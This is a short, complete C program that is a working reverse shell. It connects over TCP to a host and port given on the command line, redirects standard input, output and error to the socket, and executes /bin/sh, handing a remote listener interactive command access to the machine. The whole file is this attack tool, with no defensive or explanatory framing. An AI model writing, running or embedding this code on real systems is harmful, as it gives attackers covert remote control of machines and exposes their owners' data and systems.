#include <sys/types.h>
#include <sys/socket.h>

#include <err.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

int
reverse_try(struct addrinfo *p)
{
	int	fd;

	if ((fd = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
		warn("socket");
		return (-1);
	}
	if (connect(fd, p->ai_addr, p->ai_addrlen) == -1) {
		close(fd);
		warn("connect");
		return (-1);
	}

	return (fd);
}

int
main(int argc, char **argv)
{
	char		*exec_args[] = { "/bin/sh", NULL };
	int		 ai_ret, fd;
	struct addrinfo	 ai_hints;
	struct addrinfo	*ai_ptr, *ai_srv;

	if (argc != 3)
		errx(1, "usage: host port");

	memset(&ai_hints, 0, sizeof ai_hints);
	ai_hints.ai_family = AF_UNSPEC;
	ai_hints.ai_socktype = SOCK_STREAM;

	if ((ai_ret = getaddrinfo(argv[1], argv[2], &ai_hints, &ai_srv)) == -1)
		errx(1, "getaddrinfo: %s", gai_strerror(ai_ret));
	for (ai_ptr = ai_srv; ai_ptr != NULL; ai_ptr = ai_ptr->ai_next) {
		if ((fd = reverse_try(ai_ptr)) != -1)
			break;
	}
	if (ai_ptr == NULL)
		errx(1, "failed to connect");
	freeaddrinfo(ai_srv);

	if (dup2(fd, STDIN_FILENO) == -1)
		err(1, "dup2");
	if (dup2(fd, STDOUT_FILENO) == -1)
		err(1, "dup2");
	if (dup2(fd, STDERR_FILENO) == -1)
		err(1, "dup2");

	execve(exec_args[0], exec_args, NULL);
	err(1, "execve");

	return (0);	/* NOTREACHED */
}
